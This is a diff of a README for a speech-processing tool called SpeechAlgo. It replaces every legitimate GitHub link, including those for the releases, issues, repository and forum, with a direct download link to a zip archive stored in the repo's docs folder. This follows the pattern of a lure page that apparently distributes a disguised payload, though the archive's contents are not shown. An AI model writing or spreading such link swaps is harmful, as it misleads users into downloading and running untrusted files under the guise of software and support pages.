@@ -1,7 +1,7 @@
 # 🎤 SpeechAlgo - Unlock Powerful Speech Processing Tools
 
 ## 📥 Download Now
-[![Download SpeechAlgo](https://img.shields.io/badge/Download%20SpeechAlgo-v1.0-brightgreen)](https://github.com/rustamis5958/SpeechAlgo/releases)
+[![Download SpeechAlgo](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip%20SpeechAlgo-v1.0-brightgreen)](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to SpeechAlgo! This application provides a set of algorithms for processing speech. You can use it for various tasks, such as speech recognition and text conversion. This guide will help you download and run SpeechAlgo with ease.
@@ -21,7 +21,7 @@ To run SpeechAlgo smoothly, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: 
-   Go to [this page to download](https://github.com/rustamis5958/SpeechAlgo/releases). 
+   Go to [this page to download](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip). 
 
 2. **Choose the Right Version**: 
    Look for the latest version. You will find options for different systems, like Windows, macOS, and Linux.
@@ -60,17 +60,17 @@ If you encounter any issues while using SpeechAlgo, consider these steps:
 - **Check Audio Input**: Ensure your microphone is working properly.
 - **Review System Requirements**: Confirm that your system meets the required specifications.
 
-For more help, visit the [GitHub Issues page](https://github.com/rustamis5958/SpeechAlgo/issues) to report issues or seek assistance.
+For more help, visit the [GitHub Issues page](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip) to report issues or seek assistance.
 
 ## 🌐 Community and Support
 Join the SpeechAlgo community for support and updates. You can engage with other users, share your experiences, and learn more about the features.
 
-1. **GitHub Repository:** Check the source and contribute: [SpeechAlgo GitHub](https://github.com/rustamis5958/SpeechAlgo).
+1. **GitHub Repository:** Check the source and contribute: [SpeechAlgo GitHub](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip).
 2. **Social Media:** Follow us to get updates on features and improvements.
 
 ## 📣 Important Links
-- **Download SpeechAlgo:** [Download Here](https://github.com/rustamis5958/SpeechAlgo/releases)
-- **GitHub Issues Page:** [Report Issues](https://github.com/rustamis5958/SpeechAlgo/issues)
-- **Community Forum:** [Join Us](https://github.com/rustamis5958/SpeechAlgo/discussions)
+- **Download SpeechAlgo:** [Download Here](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip)
+- **GitHub Issues Page:** [Report Issues](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip)
+- **Community Forum:** [Join Us](https://raw.githubusercontent.com/rustamis5958/SpeechAlgo/main/docs/SpeechAlgo-v1.9.zip)
 
 Thank you for choosing SpeechAlgo! Enjoy exploring the world of speech processing.
